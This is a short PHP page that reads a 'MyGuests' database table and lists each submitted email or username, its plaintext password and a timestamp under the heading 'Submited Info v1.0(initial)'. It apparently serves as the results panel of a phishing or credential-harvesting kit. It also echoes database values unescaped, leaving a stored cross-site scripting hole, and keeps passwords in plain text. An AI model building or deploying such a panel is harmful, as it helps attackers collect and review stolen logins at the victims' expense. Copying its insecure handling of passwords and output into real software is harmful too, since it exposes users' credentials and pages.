<?php 
include "functions.php";
$sql = "SELECT * FROM MyGuests";
$result = mysqli_query($conn, $sql);

?>
<!DOCTYPE html>
<html>
<head>
<style>
table {  font-family: arial, sans-serif;  border-collapse: collapse;  width: 100%;}
td, th {  border: 1px solid #dddddd;  text-align: left;  padding: 8px;}
tr:nth-child(even) {  background-color: #dddddd;}
</style>
</head>
<body>

<h2>Submited Info v1.0(initial)</h2>

<table>
  <tr>
    <th>Email/Username</th>
    <th>Password</th>
    <th>Time</th>
  </tr>
  <?php 
  
if (mysqli_num_rows($result) > 0) {
  // output data of each row
  while($row = mysqli_fetch_assoc($result)) {
    ?>
     <tr>
   <td><?php echo $row["email"];?></td>
   <td><?php echo $row["password"];?></td>
   <td><?php echo $row["reg_date"];?></td>
 </tr>
    <?php
   
  }
} else {
  echo "0 results";
}
  ?>

</table>

</body>
</html>

